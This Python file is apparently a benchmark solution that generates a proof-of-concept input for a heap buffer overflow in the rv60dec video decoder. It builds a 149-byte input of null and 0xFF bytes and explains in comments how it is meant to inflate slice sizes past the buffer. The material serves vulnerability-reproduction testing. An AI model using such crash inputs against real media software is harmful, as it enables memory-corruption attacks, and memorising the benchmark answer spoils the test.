import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in rv60dec.
        
        The vulnerability occurs because the decoder fails to validate that slice offsets 
        and sizes derived from the bitstream fit within the actual packet buffer.
        By providing a payload with a valid-enough header followed by bytes that decode 
        to large integer values (e.g., 0xFF in many variable-length codings), we can 
        trick the decoder into initializing a GetBitContext with a size larger than 
        the actual heap buffer, leading to an out-of-bounds read/write.
        """
        
        # Ground truth length is 149 bytes. We aim for a similar size to ensure
        # we pass any potential header parsing logic before hitting the vulnerable slice loop.
        total_length = 149
        
        # Start with 16 bytes of NULLs. 
        # This often satisfies initial checks for flags, reserved bits, or version fields 
        # (which are frequently 0).
        header = b'\x00' * 16
        
        # Fill the rest with 0xFF.
        # In many bitstream formats (like those using UE-Golomb or simple length fields),
        # a sequence of 1s (0xFF) is interpreted as a very large number (e.g., large slice count,
        # large offset, or large size).
        # This aims to set 'slice_count' or 'slice_offset' to a value that exceeds the buffer bounds.
        body_length = total_length - len(header)
        body = b'\xff' * body_length
        
        return header + body